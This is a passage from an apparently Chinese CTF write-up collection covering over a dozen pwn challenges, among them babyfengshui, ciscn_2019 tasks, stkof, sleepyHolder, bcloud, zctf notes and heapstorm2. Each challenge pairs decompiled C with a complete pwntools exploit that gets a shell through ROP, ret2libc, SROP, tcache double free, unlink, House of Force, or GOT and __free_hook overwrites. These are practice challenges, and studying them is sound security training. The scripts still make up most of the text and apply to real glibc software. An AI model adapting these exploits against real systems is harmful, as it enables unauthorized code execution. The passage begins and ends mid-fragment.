'%10$n')sla(':', '4') ciscn_2019_n_8IDA 可知需要让 var 的下标为 13 的元素（也就是第 14 个）等于 17，直接按照需求写脚本即可： 1sl(p32(17)*14) babyfengshui_33c3_2016本题源码大致如下，开启了 canary 和 NX： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758void __cdecl __noreturn main(){ char v0; // [esp+3h] [ebp-15h] int action; // [esp+4h] [ebp-14h] size_t input; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); alarm(0x14u); while ( 1 ) { puts(&quot;0: Add a user&quot;); puts(&quot;1: Delete a user&quot;); puts(&quot;2: Display a user&quot;); puts(&quot;3: Update a user description&quot;); puts(&quot;4: Exit&quot;); printf(&quot;Action: &quot;); if ( __isoc99_scanf(&quot;%d&quot;, &amp;action) == -1 ) break; if ( !action ) { printf(&quot;size of description: &quot;); __isoc99_scanf(&quot;%u%c&quot;, &amp;input, &amp;v0); add(input); } if ( action == 1 ) { printf(&quot;index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;input); delete((unsigned __int8)input); } if ( action == 2 ) { printf(&quot;index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;input); display((unsigned __int8)input); } if ( action == 3 ) { printf(&quot;index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;input); update(input); } if ( action == 4 ) { puts(&quot;Bye&quot;); exit(0); } if ( (unsigned __int8)total_users &gt; 0x31u ) { puts(&quot;maximum capacity exceeded, bye&quot;); exit(0); } } exit(1);} 我们重点关注可能存在漏洞的add和update，首先是add： 12345678910111213141516_DWORD *__cdecl add(size_t size){ void *desc; // ST24_4 _DWORD *user; // ST28_4 desc = malloc(size); memset(desc, 0, size); user = malloc(0x80u); memset(user, 0, 0x80u); *user = desc; users[(unsigned __int8)total_users] = user; printf(&quot;name: &quot;); read_name((char *)users[(unsigned __int8)total_users] + 4, 124); update(++total_users - 1); return user;} 这里可以大致了解到user结构体大约长这样： 1234struct user { char *description; char name[124];}; 注意descrption是user开始的地方。 随后发现update中存在一处防护措施： 12345678910111213141516171819202122unsigned int __cdecl sub_8048724(unsigned __int8 index){ char v2; // [esp+17h] [ebp-11h] int len; // [esp+18h] [ebp-10h] unsigned int v4; // [esp+1Ch] [ebp-Ch] v4 = __readgsdword(0x14u); if ( index &lt; (unsigned __int8)total_users &amp;&amp; users[index] ) { len = 0; printf(&quot;text length: &quot;); __isoc99_scanf(&quot;%u%c&quot;, &amp;len, &amp;v2); if ( (char *)(len + *(_DWORD *)users[index]) &gt;= (char *)users[index] - 4 ) { puts(&quot;my l33t defenses cannot be fooled, cya!&quot;); exit(1); } printf(&quot;text: &quot;); read_name(*(_DWORD *)users[index], len + 1); } return __readgsdword(0x14u) ^ v4;} 这里其实是判断当前user-&gt;description加上输入的字符串长度是否会超过user起始地址-4 的位置，目的很明显是为了防止堆溢出。预期内存布局是： 12345678910111213141516171819 --------| Desc0 | -------- &lt;- user0| &amp;Desc0 | --------| name0 | --------| Desc1 | -------- &lt;- user1| &amp;Desc1 | --------| name1 | --------| Desc2 | -------- &lt;- user2| &amp;Desc2 | --------| name2 | -------- 然而，我们还拥有删除用户的功能。假如我们删除第 0 个用户，那么他拥有的空间就被free()了。这时我们新增用户，由于desc长度可控，我们可以控制其长度让它恰好分配到原来第 0 个用户的空间，从Desc0一直到name0结束。那么此时： 1234567891011121314151617181920212223 --------| || || Desc3 || || | --------| Desc1 | -------- &lt;- user1| &amp;Desc1 | --------| name1 | --------| Desc2 | -------- &lt;- user2| &amp;Desc2 | --------| name2 | -------- &lt;- user3| &amp;Desc3 | --------| name3 | -------- 不难发现，即使有上述防护措施的限制，我们依然可以溢出到user1并覆盖其中数据。如果把 libc 中函数的 GOT 表地址放进去，然后display函数打印出来，就能泄露 libc 地址。然后进行 GOT 劫持即可 getshell。 需要注意的是，上图中Desc1前和&amp;Desc1前都有 8 字节 chunk header，覆盖时需要考虑它们占的 16B。此外，Desc0+user0原本所占的空间实际上是0x8+0x80+0x8+0x80，而Desc3申请0x100字节时实际占0x8+0x100，前者比后者多出空闲的0x8字节，也需要考虑。因此计算偏移0x100+0x8+0x8+0x80+0x8=0x198。 放上0x198字节的 padding 后，就可以把free的 GOT 地址放在&amp;Desc1处，此时打印出来的就是free的 GOT 地址，从而泄露出 libc。这时再利用更新功能用system.plt覆盖free.got，那么执行free时就会执行system。此时还差一个参数/bin/sh，我们不妨放在Desc2处，那么在删除user2时，有源码： 12345678910111213unsigned int __cdecl delete(unsigned __int8 index){ unsigned int v2; // [esp+1Ch] [ebp-Ch] v2 = __readgsdword(0x14u); if ( index &lt; (unsigned __int8)total_users &amp;&amp; users[index] ) { free(*(void **)users[index]); free(users[index]); users[index] = 0; } return __readgsdword(0x14u) ^ v2;} 这里就会执行free(address of /bin/sh)，实际上就是system('/bin/sh')。 1234567891011121314151617181920212223242526272829303132333435def add(max_len, desc_len, text): sla('Action: ', '0') sla('description: ', str(max_len)) sla('name: ', 'aaaa') sla('length: ', str(desc_len)) sla('text: ', text)def delete(index): sla('Action: ', '1') sla('index: ', str(index))def display(index): sla('Action: ', '2') sla('index: ', str(index))def update(index, desc_len, text): sla('Action: ', '3') sla('index: ', str(index)) sla('length: ', str(desc_len)) sla('text: ', text)add(0x80,0x80,'a'*0x80)add(0x80,0x80,'b'*0x80)add(0x8,0x8,'/bin/sh\\x00')delete(0)add(0x100,0x19c,'a'*0x198+p32(elf.got['free']))display(1)ru('tion: ')free = u32(r(4))leak('free',free)system,binsh = ret2libc(free, 'free')update(1,4,p32(system))delete(2) ciscn_2019_s_3本题代码很少，注意到gadgets函数中有mov rax, 0Fh和mov rax, 3Bh可以控制rax，它们恰好分别对应系统调用sigreturn和execve。因此本题可以围绕这两个系统调用给出两种做法。 比较难的做法是利用execve，我们希望执行execve('/bin/sh',0,0)，那么还需要控制rdi,rsi,rdx。这里需要几个 gadgets，但是gadgets函数中的不够用，所以可以ret2csu。/bin/sh需要我们自己写，但只能写到栈上，因此需要通过write泄露栈地址。 我们输入的内容位于rbp-0x10，那么填充 16 字节后填充main函数地址即可重启程序同时泄露栈地址，gdb 调试可知泄露位置距离我们的输入偏移量为0x118字节。 最后在栈上布置好/bin/sh字符串和pop_rdi的 gadget，准备好rax，返回到 csu 末尾确保rbx=0且rbp=1，将栈上pop rdi的地址给r12以便调用，随后设置rsi,rdx为 0，最后将/bin/sh的地址给rdi，调用syscall即可。 1234567891011121314syscall = 0x400517mov_rax_3b = 0x4004e2pop_rdi = 0x4005a3csu_1 = 0x400580csu_2 = 0x40059apayload = 'a'*16 + p64(elf.sym['main'])sl(payload)r(0x20)stack = uu64(r(8))-0x118leak('stack',stack)payload = flat('/bin/sh\\x00',pop_rdi,mov_rax_3b,csu_2,0,1,stack-0x18,0,0,0,csu_1,pop_rdi,stack-0x20,syscall)sl(payload) 第二种方法则是 SROP。我们利用mov rax, 0Fh控制rax为 15，随后调用syscall，相当于执行了一次sigreturn。可以伪造 sigreturn frame 来执行execve('/bin/sh',0,0)。 12345678910111213141516171819syscall = 0x400517mov_rax_0f = 0x4004dapayload = 'a'*16 + p64(elf.sym['vuln'])sl(payload)r(0x20)stack = uu64(p.r(8))-0x118leak('stack',stack)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = stackframe.rsi = 0frame.rdx = 0frame.rsp = stackframe.rip = syscallpayload = flat('/bin/sh\\x00'*2,mov_rax_0f,syscall) + str(frame)sl(payload) [HarekazeCTF2019]baby_rop发现main里有system，然后还找到了/bin/sh字符串和pop rdi的 gadget，那就老办法传参就行了，就是 getshell 之后需要找一下 flag 的位置。 12345binsh = 0x601048pop_rdi = 0x400683payload = flat('a'*0x18,pop_rdi,binsh,elf.plt['system'])sl(payload) pwn2_sctf_2016本题先会让用户设置读入数据长度，如果大于 32 则退出。由于它自己实现的get_n函数第二个参数是unsigned int，很容易想到使用整数溢出来绕过这个限制，因此可以输入-1产生栈溢出漏洞。然后 ret2libc 就好。 12345678910111213141516171819ru('read?')sl('-1')ru('data!')you_said_s = 0x80486f8payload = flat('a'*(0x2c+4),elf.plt['printf'],elf.sym['main'],you_said_s,elf.got['printf'])sl(payload)ru('You said: ')ru('You said: ')printf = u32(r(4))leak('printf',printf)system,binsh = ret2libc(printf,'printf')ru('read?')sl('-1')ru('data!')payload = flat('a'*(0x2c+4),system,'a'*4,binsh)sl(payload) ez_pz_hackover_2016这题要求字符串s以crackme\\x00开头，随后会执行memcpy将我们的输入复制到一个dest位置。我们通过 gdb 调试可以测出其距离 ebp 距离为 22，要覆盖到返回地址则需要 26 字节。至于返回地址，题目提供了字符串s的地址，但是直接以它作为返回地址会失败，gdb 调试到vuln函数中的ret语句的时候会发现，返回地址位于0xffca41dc，而我们写入的数据位于0xffca41c0，相差0x1c，因此还需要考虑该偏移量。 123456ru('crash: ')ss = int(ru('\\n'),16)leak('ss',ss)payload = 'crashme\\x00'.ljust(26,'\\x00') + p32(ss-0x1c) + asm(shellcraft.sh())sl(payload) ciscn_2019_ne_5本题有GetFlag的后门，有一个memcpy的操作，此时需要关注的偏移实际上是dest到ebp的距离。管理员密码可直接通过反编译得到。 123456binsh = 0x80482easla('password:','administrator')sla('Exit\\n:','1')payload = flat('a'*(0x48+4),elf.plt['system'],'a'*4,binsh)sla('info:',payload)sla('Exit\\n:','4') [HarekazeCTF2019]baby_rop2题目给定了libc，结合题目名可以想到ret2libc，这里只能调用printf来打印函数GOT地址，其余和常规ret2libc相同。 123456789pop_rdi = 0x400733payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['printf'],elf.sym['main'])sla('name?', payload)ru('\\n')read = uu64(r(6))leak('read', read)system, binsh = ret2libc(read, 'read', './libc.so.6')payload = flat('a'*0x28,pop_rdi,binsh,system,'a'*8)sla('name?', payload) ciscn_2019_n_5本题没有开启任何保护，因此方法多样，例如ret2libc： 123456789101112sla('name\\n', 'merc')pop_rdi = 0x400713#ret = 0x4004c9payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['puts'],elf.sym['main'])ru('me?\\n')sl(payload)read = uu64(r(6))leak('read',read)sla('name\\n', 'merc')system, binsh = ret2libc(read,'read')payload = flat('a'*0x28,pop_rdi,binsh,system,'a'*8)sla('me?\\n', payload) 或者更简单的ret2shellcode： 1234sla('name\\n', asm(shellcraft.sh()))payload = flat('a'*0x28,0x601080)ru('me?\\n')sl(payload) 由于远程libc版本和本地二进制文件的版本不同，打远程时推荐使用ret2shellcode，感觉这个更接近预期解。 ciscn_2019_final_3提供了libc，发现是2.27版本的，考虑和tcache利用有关。 程序提供了add和remove两个功能，首先add只能创建小于0x78字节的chunk，且最多创建0x18个chunk。gift会返回分配到的内存地址。而在remove中，free之后没有将指针置null，存在double free。 由于题目给了libc，我们希望能泄露libc地址，这就需要tcache中某节点的fd指向libc。而我们知道，unsorted bin指向main_arena的指针是指向libc的，那么能不能把这个指针给tcache中某节点的fd呢？ 由于0x78字节的限制我们无法直接创建适合放入unsorted bin中的chunk，因此需要先合并小堆块，然后修改chunk0的chunk_size把他变成一个大堆块。那么如何修改这个chunk_size字段？这就需要用到double free，假设我们连续申请堆块申请到了chunk11： 1234chunk0 = add(0x78)add(0x18)for i in range(10): add(0x78) 注：第二次分配了0x18字节是64位下最小分配大小。这个chunk1的分配是为了让unsorted bin与tcache错位。 那么这时连续两次free掉chunk11，再add回来，使得chunk11-&gt;fd = chunk0-0x10，那么我们就在chunk0-0x10处伪造了一个堆块，再次add就会分配到chunk0-0x10，此时填入准备好的prev_size及chunk_size即可修改chunk0大小。注意为了确保释放后进入unsorted bin，chunk_size需大于0x400字节。 12345remove(11)remove(11)add(0x78,p64(chunk0-0x10)) # chunk11-&gt;fd = chunk0-0x10add(0x78,p64(chunk0-0x10))add(0x78,p64(0)+p64(0x4a1)) 随后我们释放chunk0就会进入unsorted bin，而释放chunk1会进入tcache[0]。此时add就会得到chunk0，并使得chunk1-&gt;fd = main_arena，那么接下来一次add得到chunk1，下一次add得到main_arena，减去偏移量即libc基址。 1234567remove(0) # unsorted binremove(1) # tcache[0]add(0x78) # chunk0; chunk1-&gt;fd = main_arenaadd(0x18) # chunk1main_arena = add(0x18)base = main_arena - 0x3ebca0leak('base', base) 最后再次利用double free，用one_gadget覆盖free_hook，再次调用remove即可。 1234567891011libc = ELF('./libc.so.6')free_hook = base + libc.sym['__free_hook']one_gadget = base + 0x10a38cadd(0x28)remove(18)remove(18)add(0x28, p64(free_hook))add(0x28, p64(free_hook))add(0x28, p64(one_gadget))remove(0) ciscn_2019_es_2只能溢出8字节，空间太小，因此考虑栈迁移。如下布置栈： 123456789101112ret addrebp-0x2cpadding/sh\\x00/binebp-0x1cpaddingsystempaddingebp-0x24paddingpadding 得到： 123456sa('name?\\n','a'*0x28)ru('a'*0x28)ebp = uu32(r(4))leak('ebp', ebp)payload = flat('a'*8,ebp-0x24,'a'*4,elf.plt['system'],'a'*4,ebp-0x1c,'/bin/sh\\x00','a'*4,ebp-0x2c)s(payload) roarctf_2019_easy_pwn本题在write时存在off_by_one漏洞： 123456789101112__int64 __fastcall sub_E26(signed int a1, unsigned int a2){ __int64 result; // rax if ( a1 &gt; (signed int)a2 ) return a2; if ( a2 - a1 == 10 ) LODWORD(result) = a1 + 1; else LODWORD(result) = a1; return (unsigned int)result;} 如果编辑时输入的size比创建时的size大10，就可以多输入一个字节。这多出来的一个字节可以覆盖到下一个chunk的chunk_size字段，从而修改其大小，造成堆块重叠。 首先连续创建5个chunk，其中第0个的大小必须以8结尾，否则只能溢出到prev_size而不是chunk_size。编辑0中数据，触发off_by_one条件溢出修改1的大小。随后free(1)使其对应大小的chunk进入unsorted bin，此时2的fd即指向main_arena+88，从而可以泄露libc。 1234567891011add(0x58) # 0for i in range(4): add(0x60) # 1edit(0, 0x58+10, 'a'*0x58+'\\xe1')delete(1)add(0x60) # 1show(2) # 2ru('content: ')main_arena = uu64(r(6)) - 88base = main_arena - libc.sym['__malloc_hook'] - 0x10leak('base', base) 接下来先绕过fastbin的大小检查，随后向fd写入malloc_hook上方的地址后申请回来，从申请到的地址出发填充11字节后即可用one_gadget覆盖__malloc_hook。但是需要注意的是one_gadget的约束条件得不到满足，因此需要先执行__libc_realloc对rsp进行调整。最后用one_gadget覆盖__realloc_hook。 12345678add(0x60) # 5 (2)delete(2) # bypass fastbin checkedit(5,0x8,p64(main_arena-0x33)) # above malloc_hookadd(0x60) # 2add(0x60) # 6payload = flat('a'*0xb,base+0x4526a,base+libc.sym['realloc']+2)edit(6,len(payload),payload)add(0x18) ciscn_2019_n_3本题do_new函数先创建0xc的chunk，包含填充的数字、对数字的打印函数和释放函数；而如果申请的是string类型，且长度不超过0x400的话，随后还会创建一个新的chunk，包含字符串内容、对字符串的打印函数和释放函数。 而在do_del中，free后没有清空指针，存在uaf。因此可以先申请两个堆块（总大小大于0xc）然后依次释放，再申请一个大小为0xc的堆块。那么此时先会拿出chunk1的0xc这一块，再拿出chunk0的0xc这一块，后者是我们可写的。 通过逆向可知结构体偏移0处是打印函数、偏移4处是释放函数，释放函数的参数是结构体指针本身。那么我们将chunk0的打印函数写成sh\\x00\\x00（注意4字节），释放函数用system覆盖，释放时就会执行system(&quot;sh&quot;)。 123456789101112131415161718def add(index,len,content='a'): sla('CNote &gt; ','1') sla('Index &gt; ',str(index)) sla('Type &gt; ','2') sla('Length &gt; ',str(len)) sla('Value &gt; ',content)def delete(index): sla('CNote &gt; ','2') sla('Index &gt; ',str(index))add(0,0x10)add(1,0x10)delete(0)delete(1)add(2,0xc,'sh\\x00\\x00'+p32(elf.sym['system']))# 0xc from 1, then 0xc from 0delete(0) hitcon2014_stkof本题共四个功能：添加、读入内容、删除、显示。其中读入内容存在堆溢出，我们可以利用这个溢出实现unlink攻击。程序中存在全局数组bag，存放所有chunk的mem指针。 先申请3个chunk，其中第1个chunk没有用，只是因为前两个chunk不连续所以才申请的。随后通过chunk2溢出到chunk3进行unlink攻击，这样修改bag[2]等价于修改bag[-1]，填充掉bag[-1]和bag[0]后，令： bag[1] = elf.got['free'] bag[2] = elf.got['fflush']，fflush可以是任意已调用的libc函数 bag[3] = elf.got['atoi'] 此时我们edit(1)写入elf.plt['puts']即可劫持free函数到puts，那么调用delete(2)就会打印出fflush地址，从而泄露libc。最后edit(3)写入system地址，劫持atoi到system，这是因为在程序读入指令时会调用atoi(&amp;nptr)，我们输入的nptr只需要是/bin/sh即可getshell。 123456789101112131415161718192021222324252627282930313233343536373839def add(size): sl('1') sl(str(size)) ru('OK\\n')def delete(index): sl('3') sl(str(index))def edit(index,content): sl('2') sl(str(index)) sl(str(len(content))) s(content) ru('OK\\n')bag = 0x602140add(0x80)add(0x80)add(0x80)fd = bag+0x10-0x18bk = bag+0x10-0x10payload = flat(0,0x80,fd,bk).ljust(0x80,'a')payload += flat(0x80,0x90)edit(2,payload)delete(3)# bag[2] &lt;-&gt; bag[-1]payload = flat('a'*0x10,elf.got['free'],elf.got['fflush'],elf.got['atoi'])edit(2,payload)edit(1,p64(elf.plt['puts']))delete(2) # puts(GOT[fflush])ru('OK\\n')fflush = uu64(r(6))leak('fflush',fflush)system,binsh = ret2libc(fflush,'fflush')edit(3,p64(system))sl('/bin/sh\\x00') sleepyHolder_hitcon_2016这道题允许保存small/big/huge secret，其中huge只能保存一次，不能删除和修改，并且在保存了一个small/big之后就不能再保存新的small/big了，只能renew。 显然这个huge就是我们漏洞利用的核心。实际上，huge的范围属于large bin，在申请这么大的chunk时如果unsorted bin中没有满足条件的，就会触发malloc_consolidate()，使fastbin中的chunk合并进入unsorted bin，最终根据合并后的大小进入small bin或large bin。那么我们不妨先申请一个small，然后申请big防止small被释放时与top chunk合并，再释放small。此时small进入fastbin，再申请huge即可让small进入到small bin。 由于这时small已经不处于fastbin链表头了，所以再次释放并不会出错，造成double free。这样之后在small内伪造chunk并unlink劫持GOT表即可。 1234567891011121314151617181920212223add(1)add(2)delete(1) # 1-&gt;fastbinadd(3) # consolidate,1-&gt;unsorted bin-&gt;smallbindelete(1)small_secret = 0x6020d0fd = small_secret - 0x18bk = small_secret - 0x10payload = flat(0,0x21,fd,bk,0x20)add(1,payload)delete(2)# ?,big,huge,small,big_flag,huge_flag,small_flagpayload = flat(0,elf.got['atoi'],elf.got['puts'],elf.got['free']) + p32(1)*3edit(1,payload)edit(1,p64(elf.plt['puts'])) # free -&gt; putsdelete(2)atoi = uu64(r(6))system,binsh = ret2libc(atoi,'atoi')edit(1,p64(system))add(2,'/bin/sh\\x00')delete(2) secretHolder_hitcon_2016类似上一题，不过huge可以修改和删除了。由于huge非常大，分配时会调用mmap()，但是当释放掉huge再申请时，mmap_threshold已经变得和huge一样大，此时分配huge使用的是brk()，因此huge被分配到了堆上。 利用这个特性，我们可以先令small和huge地址重合，随后在下面垫上big。在small里伪造堆块并释放big，触发unlink，剩余的工作就和上一题一模一样了。 1234567891011121314151617181920212223242526272829303132333435363738394041def add(type,content='a'): sla('Renew secret\\n','1') sla('Huge secret\\n',str(type)) sa(': \\n',content)def delete(type): sla('Renew secret\\n','2') sla('Huge secret\\n',str(type))def edit(type,content): sla('Renew secret\\n','3') sla('Huge secret',str(type)) sa(': \\n',content)add(1)add(2)delete(1)delete(2)add(3)delete(3) # mmap threshold +++add(3) # brk()delete(1)add(1) # small &lt;-&gt; hugeadd(2)small = 0x6020b0fd = small-0x18bk = small-0x10payload = flat(0,0x21,fd,bk,0x20,0x90,'a'*0x80)payload += flat(0,0x21,'a'*0x10,0,0x21)edit(3,payload)delete(2)# ?,big,huge,small,big_flag,huge_flag,small_flagpayload = flat(0,elf.got['atoi'],elf.got['puts'],elf.got['free']) + p32(1)*3edit(1,payload)edit(1,p64(elf.plt['puts'])) # free -&gt; putsdelete(2)atoi = uu64(r(6))system,binsh = ret2libc(atoi,'atoi')edit(1,p64(system))add(2,'/bin/sh\\x00')delete(2) bcloud_bctf_2016在读入名字和读入Org以及Host时，均存在同样的strcpy漏洞，前者导致泄露堆地址，而后者允许我们off-by-one修改top chunk的大小，从而实现House of Force。通过gdb调试得到top_chunk = heap + 0xd0，那么构造的evil_size就是我们想分配到的note_len数组地址减去header的0x8，减去old_top_chunk地址，再减去12，这是因为已经分配了三个堆块，在程序中每个堆块额外分配了4B。最后从note_len覆盖到note数组，劫持free到printf泄露libc，再劫持atoi到system。 123456789101112131415161718192021222324252627282930313233def add(len,content='a'): sla('&gt;&gt;\\n','1') sla(':\\n',str(len)) sa(':\\n',content)def delete(index): sla('&gt;&gt;\\n','4') sla(':\\n',str(index))def edit(index,content): sla('&gt;&gt;\\n','3') sla(':\\n',str(index)) sla(':\\n',content)sa('name:\\n','a'*0x40)ru('a'*0x40)heap = uu32(r(4))leak('heap',heap)sa('Org:\\n','a'*0x40)sla('Host:\\n',p32(0xffffffff))note_len = 0x804b0a0note = 0x804b120top_chunk = heap + 0xd0evil_size = note_len-0x8-top_chunk-0xc # gdbadd(evil_size,'')payload = flat((note-note_len)*'a',elf.got['atoi'],elf.got['free'],elf.got['atoi'])add(len(payload),payload)edit(1,p32(elf.plt['printf']))delete(0) # printf(atoi.got)atoi = uu32(r(4))system,binsh = ret2libc(atoi,'atoi')edit(2,p32(system))sla('&gt;&gt;\\n','/bin/sh\\x00') lctf2016_pwn200首先不难发现读入name时存在off-by-one，可以借此泄露栈地址。为了后面ret2shellcode，我们可以先在name里顺便写好shellcode： 12345payload = asm(shellcraft.sh()).ljust(48,'a')sa('u?\\n',payload)ru(payload)rbp = uu64(ru(', w',True))leak('rbp',rbp) 而读入money时，恰好可以覆盖到堆指针dest。那么可以覆盖dest为我们伪造的chunk，同时准备好id（只需要大于0x10小于0x21000即可）作为nextsize，这样就可以先释放再申请这个fake chunk，就可以控制rip了，最后覆盖rip为shellcode地址。 通过gdb调试，可以绘制大致的栈结构图： 1234567891011121314151617181920 ------------ &lt;- leaked rbp| | 0x20 ------------ &lt;- rbp| shellcode | 0x30 ------------ &lt;- shellcode_addr --| 0x20 | id | ------------ || | | ------------ || rip | | 0x40 ------------ || rbp | | ------------ || dest | | ------------ &lt;- fake --| 0x41 | ------------| prev_size | ------------| ... | 由此可以得到： 12sc = rbp-0x50fake = rbp-0x90 从而伪造堆块： 123456789sla('id ~~?\\n',str(0x20))sa('money~\\n',p64(0)*4+flat(0,0x41,0,fake))sla('choice : ','2') # freesla('choice : ','1') # mallocsla('long?',str(0x30)) # + 0x10 = 0x40ru('48')sl(flat('a'*0x18,sc))sla('choice : ','3') zctf2016_note2添加note时，存在整数溢出漏洞，导致添加大小为0的note，可以输入的长度为无符号的-1，可以认为没有限制，但是malloc依旧会分配0x20字节。利用这个堆溢出，我们先分配三个chunk： 1234567891011121314151617181920212223242526272829303132| ... | | ------------------- || 'a'*8 | | ------------------- &lt;- ptr[2] chunk2| size=0x91 | | ------------------- || prev_size | | ------------------- &lt;---------------| | | ------------------- || 'a'*8 | | ------------------- &lt;- ptr[1] chunk1| size=0x20 | | ------------------- || prev_size | | ------------------- &lt;---------------| | 0x18 | ------------------- || bp_prev_size=0x60 | | ------------------- || 'a'*0x40 | 0x40 | ------------------- || fd | bk | 0x10 | ------------------- chunk0| fake_size=0x61 | | ------------------- || fake_prev_size=0 | | ------------------- &lt;- ptr[0] || size=0x91 | | ------------------- || prev_size | | ------------------- &lt;--------------- 我们在0x80的chunk0内伪造了0x61的chunk，并通过bp_prev_size=0x60确保能通过检查。随后分配大小为0的chunk1（实际大小为0x20），由于整数溢出这里可以输入无限长度的内容，最后分配0x80的chunk2用来引起unlink。 接下来释放1再拿回来，就可以溢出到chunk2，修改其prev_size和chunk_size，前者修改为0x20+0x80=0xa0，后者置PREV_IN_USE位为0。这样再释放2就可以unlink掉我们的fake chunk了。此时ptr指向ptr-0x18，填充0x18字节后即可修改ptr[0]，之后就是常规GOT劫持了。 12345678910111213141516171819202122232425262728293031323334353637383940414243def add(len,content='a'*8): sla('&gt;&gt;','1') sla('128)',str(len)) sla('content:',content)def show(index): sla('&gt;&gt;','2') sla('note:',str(index))def edit(index,choice,content): sla('&gt;&gt;','3') sla('note:',str(index)) sla(']',str(choice)) sl(content)def delete(index): sla('&gt;&gt;','4') sla('note:',str(index))sla('name:','merc')sla('address:','privacy')ptr = 0x602120fd = ptr-0x18bk = ptr-0x10payload = flat('a'*8,0x61,fd,bk,'a'*0x40,0x60)add(0x80,payload) # 0add(0) # 1,0x20add(0x80) # 2delete(1)# padding,prev_size=0x20+0x80,PREV_IN_USE=0add(0,flat('a'*0x10,0xa0,0x90))delete(2)payload = flat('a'*0x18,elf.got['atoi'])edit(0,1,payload)show(0)ru('is ')atoi = uu64(r(6))system,binsh = ret2libc(atoi,'atoi')edit(0,1,p64(system))sla('&gt;&gt;','/bin/sh\\x00') zctf2016_note3这题和上题类似，不过bss结构大致如下： 1234567891011121314151617current_ptrnote0_ptrnote1_ptrnote2_ptrnote3_ptrnote4_ptrnote5_ptrnote6_ptrnote7_ptrnote0_sizenote1_sizenote2_sizenote3_sizenote4_sizenote5_sizenote6_sizenote7_size 本题漏洞在于edit时会判断输入的长度是否小于0，如果是就取相反数。但是可以通过整数溢出，输入0x8000000000000000，它的相反数恰好是它自身，并且依然是一个负数（-1）。这样就造成数组越界，可以覆盖到current_ptr。 我们的思路是先让current_ptr指向note3，然后利用越界覆盖一个fake_chunk到note3上，再释放note4触发unlink，此时note3_ptr指向note0_ptr，这样就可以实现GOT劫持。 但是本题的show功能被禁用，而我们还需要泄露libc地址。这里用的方法是在bss段空余处写入%llx.，然后把free先劫持到printf，去打印这一段格式化字符串，相当于手动造了一个格式化字符串漏洞。这样就可以泄露栈上内容，从而泄露位于栈上的__libc_start_main_ret地址（一般位于偏移量11处）。最后泄露libc得到system地址，覆盖atoi即可。 123456789101112131415161718192021222324252627282930313233343536373839404142def add(len,content='a'*8): sla('&gt;&gt;','1') sla('1024)',str(len)) sla('content:',content)def show(index): sla('&gt;&gt;','2') sla('note:',str(index))def edit(index,content): sla('&gt;&gt;','3') sla('note:',str(index)) sla('content:',content)def delete(index): sla('&gt;&gt;','4') sla('note:',str(index))negative = 0x8000000000000000for i in range(8): add(0x200)edit(3,'a')fd = 0x6020c8+0x8*3-0x18bk = 0x6020c8+0x8*3-0x10fake_chunk = flat(0,0x201,fd,bk).ljust(0x200,'a')fake_chunk += flat(0x200,0x210)edit(-negative,fake_chunk)delete(4)edit(3,p64(elf.got['free']))edit(0,p64(elf.plt['printf'])*2)bss_blank = 0x602100edit(3,p64(bss_blank))edit(0,'%llx.'*0x10)delete(0)lsmr = int(ru('success').split('.')[10],16)system,binsh = ret2libc(lsmr,'__libc_start_main_ret')edit(3,p64(elf.got['atoi']))edit(0,p64(system))sla('&gt;&gt;','/bin/sh\\x00') 0ctf_2018_heapstorm2分析先咕了，等完全理解了再补充。先放一些参考的wp： wp1 wp2 wp3 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192def add(size): sl('1') ru('Size: ') sl('%d' % size) ru('Command: ')def edit(index, content): sl('2') sla('Index: ',str(index)) sla('Size: ', str(len(content))) sa('Content: ',content) ru('Command: ')def free(index): sl('3') sla('Index: ',str(index)) ru('Command: ')def show(index): sl('4') sla('Index: ', str(index)) m = ru('Command: ') pos1 = m.find(']: ') + len(']: ') pos2 = m.find('\\n1. ') return m[pos1:pos2]add(0x18) # 0add(0x508) # 1add(0x18) # 2edit(1,flat('a'*0x4f0,0x500))add(0x18) # 3add(0x508) # 4add(0x18) # 5edit(4,flat('a'*0x4f0,0x500))add(0x18) # 6free(1)edit(0,'a'*(0x18-12))add(0x18) # 1add(0x4d8) # 7free(1)free(2)add(0x38) # 1add(0x4e8) # 2free(4)edit(3,'a'*(0x18-12))add(0x18) # 4add(0x4d8) # 8free(4)free(5)add(0x48) # 4free(2)add(0x4e8) # 2free(2)storage = 0x13370800fake = storage-0x20payload = flat(0,0,0,0x4f1,0,fake)edit(7,payload)payload = flat(0,0,0,0,0,0x4e1,0,fake+8,0,fake-0x18-5)edit(8,payload)try: add(0x48)except: print('Try again?')payload = flat(0,0,0,0,0,0x13377331,storage)edit(2,payload)payload = flat(0,0,0,0x13377331,storage,0x1000)p1 = payload + flat(storage-0x20+3,8)edit(0,p1)heap = uu64(show(1))p2 = payload + flat(heap+0x10,8)edit(0,p2)base = uu64(show(1))-88-libc.sym['__malloc_hook']-0x10system = base + libc.sym['system']free_hook = base + libc.sym['__free_hook']p3 = payload + flat(free_hook,0x100,storage+0x50,0x100,'/bin/sh\\x00')edit(0,p3)edit(1,p64(system))sl('3')sla('Index: ','2') houseoforange_hitcon_20161234567891011121314151617181920212223242526272829303132pwndbg&gt; p *(struct _IO_FILE*)0x555b7d04b4f0$2 = { _flags = 1852400175, _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, _IO_read_end = 0x0, _IO_read_base = 0x7f29a0f30510 &quot;&quot;, _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;, _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 '\\000', _shortbuf = &quot;&quot;, _lock = 0x0, _offset = 0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\000' &lt;repeats 19 